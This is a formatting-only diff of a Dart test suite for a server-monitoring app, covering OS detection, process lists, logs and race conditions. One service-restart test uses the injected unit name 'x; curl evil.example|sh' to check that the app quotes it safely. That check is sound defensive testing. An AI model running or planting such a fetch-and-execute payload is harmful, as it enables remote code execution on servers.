@@ -61,11 +61,7 @@ void main() {
     await db.close();
   });
 
-  Server server({
-    required String name,
-    String status = 'online',
-    String sudoPassword = '',
-  }) =>
+  Server server({required String name, String status = 'online', String sudoPassword = ''}) =>
       Server(
         id: 0,
         name: name,
@@ -182,9 +178,9 @@ void main() {
 
     test('overview fetches host metrics and caches the OS for the other tabs', () async {
       final id = await repo.insertServer(server(name: 'a'));
-      final transport = RecordingTransport(replies: {
-        "echo '@OS'": '@OS\nFreeBSD\n@CPU\nCPU: 10.0% idle\n',
-      });
+      final transport = RecordingTransport(
+        replies: {"echo '@OS'": '@OS\nFreeBSD\n@CPU\nCPU: 10.0% idle\n'},
+      );
       final vm = await boot(transport: transport);
       await Future<void>.delayed(Duration.zero);
       await vm.loadActiveTab();
@@ -193,8 +189,11 @@ void main() {
       // Probing uname once and caching it beats every tab asking for itself.
       expect(app.osForServer(id), 'FreeBSD');
       await vm.loadProcesses();
-      expect(transport.commands.last, contains('ps -axo'),
-          reason: 'the cached OS must pick the BSD ps variant');
+      expect(
+        transport.commands.last,
+        contains('ps -axo'),
+        reason: 'the cached OS must pick the BSD ps variant',
+      );
       vm.dispose();
     });
   });
@@ -253,8 +252,11 @@ void main() {
       await Future<void>.delayed(Duration.zero);
       await vm.loadServices();
 
-      expect(vm.servicesUnsupported, isTrue,
-          reason: 'otherwise the tab looks like a host running nothing');
+      expect(
+        vm.servicesUnsupported,
+        isTrue,
+        reason: 'otherwise the tab looks like a host running nothing',
+      );
       vm.dispose();
     });
 
@@ -288,8 +290,11 @@ void main() {
       );
 
       final cmd = transport.commands.firstWhere((c) => c.contains('systemctl restart'));
-      expect(cmd, contains(r"'x; curl evil.example|sh'"),
-          reason: 'quoted, so the shell treats the whole thing as one unit name');
+      expect(
+        cmd,
+        contains(r"'x; curl evil.example|sh'"),
+        reason: 'quoted, so the shell treats the whole thing as one unit name',
+      );
       vm.dispose();
     });
   });
@@ -303,9 +308,7 @@ void main() {
 
     test('a host with no log source is distinguished from one with no lines', () async {
       await repo.insertServer(server(name: 'a'));
-      final vm = await boot(
-        transport: RecordingTransport(replies: {'journalctl': '---NOLOGS---'}),
-      );
+      final vm = await boot(transport: RecordingTransport(replies: {'journalctl': '---NOLOGS---'}));
       await Future<void>.delayed(Duration.zero);
       await vm.loadLogs();
 
@@ -327,8 +330,11 @@ void main() {
       vm.logFilter = 'ERROR';
       expect(transport.commands.length, calls, reason: 'filtering is local');
       expect(vm.filteredLogs.every((l) => l.level == 'ERROR'), isTrue);
-      expect(vm.filteredLogs, isNotEmpty,
-          reason: '"disk errors detected" is an ERROR — see the §15.1 inferLevel fix');
+      expect(
+        vm.filteredLogs,
+        isNotEmpty,
+        reason: '"disk errors detected" is an ERROR — see the §15.1 inferLevel fix',
+      );
 
       vm.logFilter = 'ALL';
       expect(vm.filteredLogs, hasLength(3));
@@ -354,10 +360,13 @@ void main() {
     test('a reply for a host the user left does not overwrite the new host', () async {
       final aId = await repo.insertServer(server(name: 'a'));
       final bId = await repo.insertServer(server(name: 'b'));
-      final transport = RecordingTransport(replies: {
-        'ps -eo': '  PID USER %CPU %MEM VSZ ELAPSED STAT COMMAND\n'
-            '  1 root 9.0 1.0 100 01:00:00 S stale-proc\n',
-      });
+      final transport = RecordingTransport(
+        replies: {
+          'ps -eo':
+              '  PID USER %CPU %MEM VSZ ELAPSED STAT COMMAND\n'
+              '  1 root 9.0 1.0 100 01:00:00 S stale-proc\n',
+        },
+      );
       final vm = await boot(transport: transport);
       app.selectedServerId = aId;
       await Future<void>.delayed(Duration.zero);
@@ -372,8 +381,11 @@ void main() {
       transport.gate!.complete();
       await pending;
 
-      expect(vm.processes.any((p) => p.name == 'stale-proc'), isFalse,
-          reason: "one machine's processes must never be shown under another's name");
+      expect(
+        vm.processes.any((p) => p.name == 'stale-proc'),
+        isFalse,
+        reason: "one machine's processes must never be shown under another's name",
+      );
       vm.dispose();
     });
 
@@ -397,7 +409,8 @@ void main() {
 
       // The newer request answers first.
       transport.replies = {
-        'ps -eo': '  PID USER %CPU %MEM VSZ ELAPSED STAT COMMAND\n'
+        'ps -eo':
+            '  PID USER %CPU %MEM VSZ ELAPSED STAT COMMAND\n'
             '  2 root 1.0 1.0 100 01:00:00 S fresh-proc\n',
       };
       second.complete();
@@ -406,14 +419,18 @@ void main() {
 
       // …and the one it superseded answers afterwards.
       transport.replies = {
-        'ps -eo': '  PID USER %CPU %MEM VSZ ELAPSED STAT COMMAND\n'
+        'ps -eo':
+            '  PID USER %CPU %MEM VSZ ELAPSED STAT COMMAND\n'
             '  1 root 9.0 1.0 100 01:00:00 S stale-proc\n',
       };
       first.complete();
       await stale;
 
-      expect(vm.processes.single.name, 'fresh-proc',
-          reason: 'the superseded load must not overwrite the newer result');
+      expect(
+        vm.processes.single.name,
+        'fresh-proc',
+        reason: 'the superseded load must not overwrite the newer result',
+      );
       expect(vm.processesLoading, isFalse);
       vm.dispose();
     });
@@ -438,10 +455,13 @@ void main() {
       final aId = await repo.insertServer(server(name: 'a'));
       final bId = await repo.insertServer(server(name: 'b'));
       final vm = await boot(
-        transport: RecordingTransport(replies: {
-          'ps -eo': '  PID USER %CPU %MEM VSZ ELAPSED STAT COMMAND\n'
-              '  1 root 9.0 1.0 100 01:00:00 S proc-a\n',
-        }),
+        transport: RecordingTransport(
+          replies: {
+            'ps -eo':
+                '  PID USER %CPU %MEM VSZ ELAPSED STAT COMMAND\n'
+                '  1 root 9.0 1.0 100 01:00:00 S proc-a\n',
+          },
+        ),
       );
       app.selectedServerId = aId;
       await Future<void>.delayed(Duration.zero);
